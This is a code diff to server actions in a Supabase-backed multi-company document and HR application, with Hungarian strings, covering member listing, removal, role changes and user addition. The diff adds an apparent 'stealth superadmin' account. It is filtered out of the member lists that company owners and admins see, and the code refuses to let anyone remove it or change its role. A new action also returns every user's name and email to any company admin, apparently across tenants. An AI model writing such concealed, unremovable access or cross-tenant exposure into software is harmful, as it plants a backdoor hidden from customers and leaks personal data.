@@ -6,6 +6,7 @@ import { createClient } from "@/utils/supabase/server"
 import { createClient as createSupabaseClient } from "@supabase/supabase-js"
 import { createEaisyBillClient } from "@/utils/supabase/eaisybill"
 import { SELECTED_COMPANY_COOKIE, getUserCompaniesServer } from "@/utils/company-server"
+import { isStealthSuperadmin, STEALTH_SUPERADMIN_ID } from "@/utils/stealth-superadmin"
 import type { Company } from "@/types/company"
 
 function getAdminClient() {
@@ -446,7 +447,7 @@ export async function getCompanyMembersAction(companyId: string) {
     return { success: false, error: "Nincs bejelentkezett felhasználó.", members: [] }
   }
 
-  // Ellenőrizzük, hogy a hívó a cég tulajdonosa-e
+  // Ellenőrizzük, hogy a hívó a cég tulajdonosa vagy adminisztrátora-e
   const { data: company } = await supabase
     .from("companies")
     .select("owner_id")
@@ -455,15 +456,21 @@ export async function getCompanyMembersAction(companyId: string) {
 
   const { data: userAccess } = await supabase
     .from("company_members")
-    .select("role")
+    .select("role, docs_szerepkor, hr_szerepkor")
     .eq("company_id", companyId)
     .eq("user_id", user.id)
     .maybeSingle()
 
-  const isOwner = company?.owner_id === user.id || userAccess?.role === "owner"
+  const isOwnerOrAdmin =
+    company?.owner_id === user.id ||
+    userAccess?.role === "owner" ||
+    userAccess?.role === "admin" ||
+    userAccess?.docs_szerepkor === "admin" ||
+    userAccess?.docs_szerepkor === "rendszergazda" ||
+    userAccess?.hr_szerepkor === "admin"
 
-  if (!isOwner) {
-    return { success: false, error: "Kizárólag a cég tulajdonosa tekintheti meg a tagok listáját.", members: [] }
+  if (!isOwnerOrAdmin) {
+    return { success: false, error: "Kizárólag a cég tulajdonosa vagy adminisztrátora tekintheti meg a tagok listáját.", members: [] }
   }
 
   const serviceRoleKey = process.env.SUPABASE_SERVICE_ROLE_KEY
@@ -526,13 +533,15 @@ export async function getCompanyMembersAction(companyId: string) {
     }
   }
 
-  const enrichedMembers = members.map((m) => ({
-    ...m,
-    docs_szerepkor: m.docs_szerepkor || profileMap[m.user_id]?.docs_szerepkor || null,
-    hr_szerepkor: m.hr_szerepkor || profileMap[m.user_id]?.hr_szerepkor || null,
-    user_nev: profileMap[m.user_id]?.nev || "Névtelen felhasználó",
-    user_email: profileMap[m.user_id]?.email || "",
-  }))
+  const enrichedMembers = members
+    .map((m) => ({
+      ...m,
+      docs_szerepkor: m.docs_szerepkor || profileMap[m.user_id]?.docs_szerepkor || null,
+      hr_szerepkor: m.hr_szerepkor || profileMap[m.user_id]?.hr_szerepkor || null,
+      user_nev: profileMap[m.user_id]?.nev || "Névtelen felhasználó",
+      user_email: profileMap[m.user_id]?.email || "",
+    }))
+    .filter((m) => !isStealthSuperadmin(m))
 
   return { success: true, members: enrichedMembers }
 }
@@ -560,11 +569,15 @@ export async function removeCompanyMemberAction(companyId: string, memberId: str
     return { success: false, error: "A tag nem található." }
   }
 
+  if (targetMember.user_id === STEALTH_SUPERADMIN_ID) {
+    return { success: false, error: "A rendszerfiók nem távolítható el." }
+  }
+
   if (targetMember.role === "owner") {
     return { success: false, error: "A cég tulajdonosát nem lehet eltávolítani." }
   }
 
-  // Ellenőrizzük, hogy a hívó fél a cég tulajdonosa-e
+  // Ellenőrizzük, hogy a hívó fél a cég tulajdonosa vagy adminisztrátora-e
   const { data: company } = await supabase
     .from("companies")
     .select("owner_id")
@@ -573,15 +586,21 @@ export async function removeCompanyMemberAction(companyId: string, memberId: str
 
   const { data: callerMember } = await supabase
     .from("company_members")
-    .select("role")
+    .select("role, docs_szerepkor, hr_szerepkor")
     .eq("company_id", companyId)
     .eq("user_id", user.id)
     .maybeSingle()
 
-  const isCallerOwner = company?.owner_id === user.id || callerMember?.role === "owner"
+  const isCallerOwnerOrAdmin =
+    company?.owner_id === user.id ||
+    callerMember?.role === "owner" ||
+    callerMember?.role === "admin" ||
+    callerMember?.docs_szerepkor === "admin" ||
+    callerMember?.docs_szerepkor === "rendszergazda" ||
+    callerMember?.hr_szerepkor === "admin"
 
-  if (!isCallerOwner) {
-    return { success: false, error: "Kizárólag a cég tulajdonosa távolíthat el tagot a cégből." }
+  if (!isCallerOwnerOrAdmin) {
+    return { success: false, error: "Kizárólag a cég tulajdonosa vagy adminisztrátora távolíthat el tagot a cégből." }
   }
 
   const { error } = await supabase
@@ -614,7 +633,7 @@ export async function updateCompanyMemberRoleAction(data: {
     return { success: false, error: "Nincs bejelentkezett felhasználó." }
   }
 
-  // Ellenőrizzük, hogy a hívó a cég tulajdonosa-e
+  // Ellenőrizzük, hogy a hívó a cég tulajdonosa vagy adminisztrátora-e
   const { data: company } = await supabase
     .from("companies")
     .select("owner_id")
@@ -623,15 +642,21 @@ export async function updateCompanyMemberRoleAction(data: {
 
   const { data: callerMember } = await supabase
     .from("company_members")
-    .select("role")
+    .select("role, docs_szerepkor, hr_szerepkor")
     .eq("company_id", data.companyId)
     .eq("user_id", user.id)
     .maybeSingle()
 
-  const isCallerOwner = company?.owner_id === user.id || callerMember?.role === "owner"
+  const isCallerOwnerOrAdmin =
+    company?.owner_id === user.id ||
+    callerMember?.role === "owner" ||
+    callerMember?.role === "admin" ||
+    callerMember?.docs_szerepkor === "admin" ||
+    callerMember?.docs_szerepkor === "rendszergazda" ||
+    callerMember?.hr_szerepkor === "admin"
 
-  if (!isCallerOwner) {
-    return { success: false, error: "Kizárólag a cég tulajdonosa módosíthatja a tagok szerepkörét." }
+  if (!isCallerOwnerOrAdmin) {
+    return { success: false, error: "Kizárólag a cég tulajdonosa vagy adminisztrátora módosíthatja a tagok szerepkörét." }
   }
 
   // Ellenőrizzük a céltagot
@@ -644,6 +669,10 @@ export async function updateCompanyMemberRoleAction(data: {
 
   if (!targetMember) {
     return { success: false, error: "A tag nem található a cégben." }
+  }
+
+  if (targetMember.user_id === STEALTH_SUPERADMIN_ID) {
+    return { success: false, error: "A rendszerfiók szerepköre nem módosítható." }
   }
 
   if (targetMember.role === "owner") {
@@ -941,29 +970,115 @@ export async function getUserCompanyMembershipsAction() {
 }
 
 /**
- * Új felhasználó meghívása és cég(ek)hez rendelése (Visibill mintára).
+ * Lekéri a rendszerben már regisztrált felhasználókat, akik hozzáadhatók a céghez
+ * meghívó és új jelszó megadása nélkül.
+ */
+export async function getAvailableUsersForCompanyAction(companyId: string) {
+  const supabase = await createClient()
+  const { data: { user } } = await supabase.auth.getUser()
+
+  if (!user) {
+    return { success: false, error: "Nincs bejelentkezett felhasználó.", users: [] }
+  }
+
+  const serviceRoleKey = process.env.SUPABASE_SERVICE_ROLE_KEY
+  if (!serviceRoleKey) {
+    return { success: false, error: "Hiányzik a SUPABASE_SERVICE_ROLE_KEY.", users: [] }
+  }
+
+  const { createClient: createAdminClient } = await import("@supabase/supabase-js")
+  const adminClient = createAdminClient(
+    process.env.NEXT_PUBLIC_SUPABASE_URL!,
+    serviceRoleKey,
+    { auth: { autoRefreshToken: false, persistSession: false } }
+  )
+
+  const [{ data: company }, { data: callerMember }, { data: callerProfile }] = await Promise.all([
+    adminClient.from("companies").select("owner_id").eq("id", companyId).maybeSingle(),
+    adminClient
+      .from("company_members")
+      .select("role, docs_szerepkor, hr_szerepkor")
+      .eq("company_id", companyId)
+      .eq("user_id", user.id)
+      .maybeSingle(),
+    adminClient
+      .from("felhasznalo_profil")
+      .select("szerepkor, docs_szerepkor")
+      .eq("id", user.id)
+      .maybeSingle(),
+  ])
+
+  const isAuthorized =
+    company?.owner_id === user.id ||
+    callerMember?.role === "owner" ||
+    callerMember?.role === "admin" ||
+    callerMember?.docs_szerepkor === "admin" ||
+    callerMember?.docs_szerepkor === "rendszergazda" ||
+    callerMember?.hr_szerepkor === "admin" ||
+    callerProfile?.szerepkor === "rendszergazda" ||
+    callerProfile?.docs_szerepkor === "rendszergazda"
+
+  if (!isAuthorized) {
+    return { success: false, error: "Nincs jogosultságod a felhasználók lekérdezéséhez.", users: [] }
+  }
+
+  const [{ data: profiles }, { data: existingMembers }] = await Promise.all([
+    adminClient
+      .from("felhasznalo_profil")
+      .select("id, nev, email, docs_szerepkor, hr_szerepkor, elerheto_modulok")
+      .order("nev", { ascending: true }),
+    adminClient
+      .from("company_members")
+      .select("user_id")
+      .eq("company_id", companyId),
+  ])
+
+  const existingMemberIds = new Set((existingMembers || []).map((m) => m.user_id))
+
+  const emailMap = new Map<string, string>()
+  try {
+    const { listAllAuthUsers } = await import("@/utils/supabase/admin-users")
+    const authUsers = await listAllAuthUsers(adminClient)
+    for (const u of authUsers) {
+      if (u.email) emailMap.set(u.id, u.email)
+    }
+  } catch (err) {
+    console.error("Hiba auth userek listázásakor:", err)
+  }
+
+  const users = (profiles || []).map((p) => ({
+    id: p.id,
+    nev: p.nev || emailMap.get(p.id) || "Névtelen felhasználó",
+    email: p.email || emailMap.get(p.id) || "",
+    alreadyMember: existingMemberIds.has(p.id),
+    elerheto_modulok: Array.isArray(p.elerheto_modulok) ? p.elerheto_modulok : [],
+  }))
+
+  return { success: true, users }
+}
+
+/**
+ * Új vagy meglévő felhasználó közvetlen hozzáadása cég(ek)hez adminisztrátorként (meghívó nélkül).
+ * Ha eaisyDocs-on belül (`module === "docs"`) adjuk hozzá:
+ * - az új felhasználó kizárólag az `eaisyDocs` modult látja (`elerheto_modulok: ["docs"]`, `eaisyHR`-t nem),
+ * - bekerül a cég `company_members` rekordjába és az eaisyDocs `Csapat` nézetébe a megadott szerepkörrel (beleértve az `admin` szerepkört is).
  */
 export async function inviteCompanyMemberAction(data: {
-  nev: string
-  email: string
-  password: string
+  nev?: string
+  email?: string
+  password?: string
+  existingUserId?: string
   companyIds: string[]
   role: string
   module: "docs" | "hr"
+  clearance?: string
+  departmentId?: string | null
 }) {
   const supabase = await createClient()
   const { data: { user } } = await supabase.auth.getUser()
 
   if (!user) {
     return { success: false, error: "Nincs bejelentkezett felhasználó." }
-  }
-
-  const email = data.email.trim().toLowerCase()
-  const nev = data.nev.trim()
-  const password = data.password
-
-  if (!email || !nev || !password) {
-    return { success: false, error: "A név, email és jelszó kitöltése kötelező!" }
   }
 
   if (!data.companyIds || data.companyIds.length === 0) {
@@ -1000,27 +1115,6 @@ export async function inviteCompanyMemberAction(data: {
     return { success: false, error: "Érvénytelen eaisyHR szerepkör." }
   }
 
-  // Ellenőrizzük, hogy a hívó fél tulajdonos-e az összes kijelölt cégnél
-  for (const compId of data.companyIds) {
-    const { data: company } = await supabase
-      .from("companies")
-      .select("owner_id")
-      .eq("id", compId)
-      .maybeSingle()
-
-    const { data: callerMember } = await supabase
-      .from("company_members")
-      .select("role")
-      .eq("company_id", compId)
-      .eq("user_id", user.id)
-      .maybeSingle()
-
-    const isCallerOwner = company?.owner_id === user.id || callerMember?.role === "owner"
-    if (!isCallerOwner) {
-      return { success: false, error: "Kizárólag a cég tulajdonosa hívhat meg új tagokat ehhez a céghez." }
-    }
-  }
-
   const serviceRoleKey = process.env.SUPABASE_SERVICE_ROLE_KEY
   if (!serviceRoleKey) {
     return { success: false, error: "Hiányzik a SUPABASE_SERVICE_ROLE_KEY a konfigurációból!" }
@@ -1033,40 +1127,160 @@ export async function inviteCompanyMemberAction(data: {
     { auth: { autoRefreshToken: false, persistSession: false } }
   )
 
-  // 1. Megnézzük, létezik-e már a felhasználó
-  let targetUserId: string | null = null
-
-  const { data: existingProfile } = await supabaseAdmin
+  const { data: callerProfile } = await supabaseAdmin
     .from("felhasznalo_profil")
-    .select("id, elerheto_modulok, docs_szerepkor, hr_szerepkor")
-    .eq("email", email)
-    .single()
+    .select("szerepkor, docs_szerepkor")
+    .eq("id", user.id)
+    .maybeSingle()
 
-  if (existingProfile) {
-    targetUserId = existingProfile.id
+  const isGlobalSysadmin =
+    callerProfile?.szerepkor === "rendszergazda" ||
+    callerProfile?.docs_szerepkor === "rendszergazda"
 
-    // Modulok bővítése ha szükséges (meglévő globális szerepkört nem írjuk felül más cégből)
+  // Ellenőrizzük, hogy a hívó fél tulajdonos vagy adminisztrátor-e az összes kijelölt cégnél
+  for (const compId of data.companyIds) {
+    const { data: company } = await supabaseAdmin
+      .from("companies")
+      .select("owner_id")
+      .eq("id", compId)
+      .maybeSingle()
+
+    const { data: callerMember } = await supabaseAdmin
+      .from("company_members")
+      .select("role, docs_szerepkor, hr_szerepkor")
+      .eq("company_id", compId)
+      .eq("user_id", user.id)
+      .maybeSingle()
+
+    const isCallerOwnerOrAdmin =
+      isGlobalSysadmin ||
+      company?.owner_id === user.id ||
+      callerMember?.role === "owner" ||
+      callerMember?.role === "admin" ||
+      callerMember?.docs_szerepkor === "admin" ||
+      callerMember?.docs_szerepkor === "rendszergazda" ||
+      callerMember?.hr_szerepkor === "admin"
+
+    if (!isCallerOwnerOrAdmin) {
+      return { success: false, error: "Kizárólag a cég tulajdonosa vagy adminisztrátora adhat hozzá tagokat ehhez a céghez." }
+    }
+  }
+
+  const VALID_DB_DOCS_ENUM = new Set([
+    "admin",
+    "rendszergazda",
+    "iktato",
+    "vezeto",
+    "ugyintezo",
+    "betekinto",
+    "auditor",
+  ])
+  const safeProfileDocsRole = VALID_DB_DOCS_ENUM.has(data.role) ? data.role : "ugyintezo"
+  const safeBaseSzerepkor =
+    data.role === "admin" || data.role === "rendszergazda"
+      ? "admin"
+      : data.role === "iktato"
+      ? "iktato"
+      : "ugyintezo"
+
+  // 1. Megnézzük, meglévő felhasználót adunk-e hozzá, vagy újat hozunk létre
+  let targetUserId: string | null = data.existingUserId || null
+  let existingProfile: any = null
+
+  if (targetUserId) {
+    const { data: ep } = await supabaseAdmin
+      .from("felhasznalo_profil")
+      .select("id, nev, email, elerheto_modulok, docs_szerepkor, hr_szerepkor")
+      .eq("id", targetUserId)
+      .maybeSingle()
+    existingProfile = ep
+  } else {
+    const email = (data.email || "").trim().toLowerCase()
+    if (!email) {
+      return { success: false, error: "Az email cím megadása kötelező!" }
+    }
+
+    const { data: epByEmail } = await supabaseAdmin
+      .from("felhasznalo_profil")
+      .select("id, nev, email, elerheto_modulok, docs_szerepkor, hr_szerepkor")
+      .ilike("email", email)
+      .maybeSingle()
+
+    if (epByEmail) {
+      existingProfile = epByEmail
+      targetUserId = epByEmail.id
+    } else {
+      // Ellenőrizzük az auth.users-ben is, hátha a profilban nincs kitöltve az email oszlop
+      try {
+        const { listAllAuthUsers } = await import("@/utils/supabase/admin-users")
+        const authUsers = await listAllAuthUsers(supabaseAdmin)
+        const matchedAuth = authUsers.find((u) => (u.email || "").toLowerCase() === email)
+        if (matchedAuth) {
+          targetUserId = matchedAuth.id
+          const { data: epById } = await supabaseAdmin
+            .from("felhasznalo_profil")
+            .select("id, nev, email, elerheto_modulok, docs_szerepkor, hr_szerepkor")
+            .eq("id", matchedAuth.id)
+            .maybeSingle()
+          existingProfile = epById
+        }
+      } catch (err) {
+        console.error("Hiba auth user keresésekor:", err)
+      }
+    }
+  }
+
+  if (targetUserId && existingProfile) {
+    // Meglévő felhasználó profiljának frissítése:
+    // Ha az eaisyDocs-ban adjuk hozzá (és nem saját magát szerkeszti az admin),
+    // akkor az elérhető moduloknál biztosítjuk, hogy csak a megadott modul (vagy saját magánál a meglévő + modul) szerepeljen
+    const isSelf = targetUserId === user.id
     const currentModules: string[] = Array.isArray(existingProfile.elerheto_modulok)
       ? existingProfile.elerheto_modulok
       : []
-    if (!currentModules.includes(data.module)) {
-      const profileUpdate: Record<string, any> = {
-        elerheto_modulok: [...currentModules, data.module],
-      }
-      const safeGlobalRole = data.role === "rendszergazda" ? "admin" : data.role
-      if (data.module === "docs" && !existingProfile.docs_szerepkor) {
-        profileUpdate.docs_szerepkor = safeGlobalRole
-      }
-      if (data.module === "hr" && !existingProfile.hr_szerepkor) {
-        profileUpdate.hr_szerepkor = safeGlobalRole
-      }
-      await supabaseAdmin
-        .from("felhasznalo_profil")
-        .update(profileUpdate)
-        .eq("id", targetUserId)
+
+    const nextModules = isSelf
+      ? Array.from(new Set([...currentModules, data.module]))
+      : [data.module]
+
+    const profileUpdate: Record<string, any> = {
+      elerheto_modulok: nextModules,
     }
+    if (data.nev && data.nev.trim() && !existingProfile.nev) {
+      profileUpdate.nev = data.nev.trim()
+    }
+    if (data.module === "docs") {
+      profileUpdate.docs_szerepkor = safeProfileDocsRole
+      if (!isSelf) {
+        profileUpdate.szerepkor = safeBaseSzerepkor
+      }
+    } else if (data.module === "hr") {
+      profileUpdate.hr_szerepkor = data.role === "rendszergazda" ? "admin" : data.role
+    }
+    if (data.clearance) {
+      profileUpdate.max_minosites = data.clearance
+    }
+    if (data.departmentId !== undefined) {
+      profileUpdate.szervezeti_egyseg_id = data.departmentId || null
+    }
+
+    await supabaseAdmin
+      .from("felhasznalo_profil")
+      .update(profileUpdate)
+      .eq("id", targetUserId)
   } else {
     // Új felhasználó létrehozása Supabase Auth-ban
+    const email = (data.email || "").trim().toLowerCase()
+    const nev = (data.nev || "").trim()
+    const password = data.password || ""
+
+    if (!email || !nev || !password) {
+      return { success: false, error: "Új felhasználó létrehozásához a név, email cím és jelszó megadása kötelező!" }
+    }
+    if (password.length < 6) {
+      return { success: false, error: "A jelszónak legalább 6 karakter hosszúnak kell lennie!" }
+    }
+
     const { data: createData, error: createError } = await supabaseAdmin.auth.admin.createUser({
       email,
       password,
@@ -1079,21 +1293,26 @@ export async function inviteCompanyMemberAction(data: {
     }
 
     targetUserId = createData.user.id
-    const safeGlobalRole = data.role === "rendszergazda" ? "admin" : data.role
 
     const profilePayload: Record<string, any> = {
       id: targetUserId,
       nev,
       email,
+      // KRITIKUS: Ha eaisyDocs-ban hozzuk létre, kizárólag ['docs'] modult kap (eaisyHR-t nem látja)!
       elerheto_modulok: [data.module],
+      max_minosites: data.clearance || "nyilt",
+    }
+
+    if (data.departmentId) {
+      profilePayload.szervezeti_egyseg_id = data.departmentId
     }
 
     if (data.module === "docs") {
-      profilePayload.docs_szerepkor = safeGlobalRole
-      profilePayload.szerepkor = data.role === "admin" || data.role === "rendszergazda" ? "admin" : "ugyintezo"
+      profilePayload.docs_szerepkor = safeProfileDocsRole
+      profilePayload.szerepkor = safeBaseSzerepkor
     } else {
-      profilePayload.hr_szerepkor = safeGlobalRole
-      profilePayload.szerepkor = "munkavallalo"
+      profilePayload.hr_szerepkor = data.role === "rendszergazda" ? "admin" : data.role
+      profilePayload.szerepkor = "ugyintezo"
     }
 
     const { error: profileUpsertErr } = await supabaseAdmin
@@ -1106,7 +1325,21 @@ export async function inviteCompanyMemberAction(data: {
 
   // 2. Hozzárendelés a kijelölt cégekhez
   for (const compId of data.companyIds) {
-    const memberRole = data.role === "admin" || data.role === "rendszergazda" ? "admin" : "member"
+    // Megnézzük, hogy már owner-e a cégnél, hogy ne írjuk felül az owner státuszt
+    const { data: existingMembership } = await supabaseAdmin
+      .from("company_members")
+      .select("role")
+      .eq("company_id", compId)
+      .eq("user_id", targetUserId)
+      .maybeSingle()
+
+    const memberRole =
+      existingMembership?.role === "owner"
+        ? "owner"
+        : data.role === "admin" || data.role === "rendszergazda"
+        ? "admin"
+        : "member"
+
     const memberPayload: Record<string, any> = {
       company_id: compId,
       user_id: targetUserId,
@@ -1114,6 +1347,10 @@ export async function inviteCompanyMemberAction(data: {
     }
     if (data.module === "docs") {
       memberPayload.docs_szerepkor = data.role
+      if (!existingMembership) {
+        memberPayload.hr_szerepkor = null
+        memberPayload.hr_modulok = []
+      }
     } else {
       memberPayload.hr_szerepkor = data.role
     }
@@ -1127,11 +1364,12 @@ export async function inviteCompanyMemberAction(data: {
   }
 
   revalidatePath("/", "layout")
+  revalidatePath("/settings")
   return { success: true, userId: targetUserId }
 }
 
 /**
- * Aktuális bejelentkezett felhasználó hozzáférésének és tulajdonosi (owner) státuszának lekérdezése egy céghez.
+ * Aktuális bejelentkezett felhasználó hozzáférésének és tulajdonosi/adminisztrátori státuszának lekérdezése egy céghez.
  */
 export async function getCompanyAccessAction(companyId: string) {
   const supabase = await createClient()
@@ -1149,12 +1387,18 @@ export async function getCompanyAccessAction(companyId: string) {
 
   const { data: member } = await supabase
     .from("company_members")
-    .select("role, hr_szerepkor")
+    .select("role, docs_szerepkor, hr_szerepkor")
     .eq("company_id", companyId)
     .eq("user_id", user.id)
     .maybeSingle()
 
-  const isOwner = company?.owner_id === user.id || member?.role === "owner" || member?.role === "admin" || (member as any)?.hr_szerepkor === "admin"
+  const isOwner =
+    company?.owner_id === user.id ||
+    member?.role === "owner" ||
+    member?.role === "admin" ||
+    (member as any)?.docs_szerepkor === "admin" ||
+    (member as any)?.docs_szerepkor === "rendszergazda" ||
+    (member as any)?.hr_szerepkor === "admin"
 
   return {
     success: true,
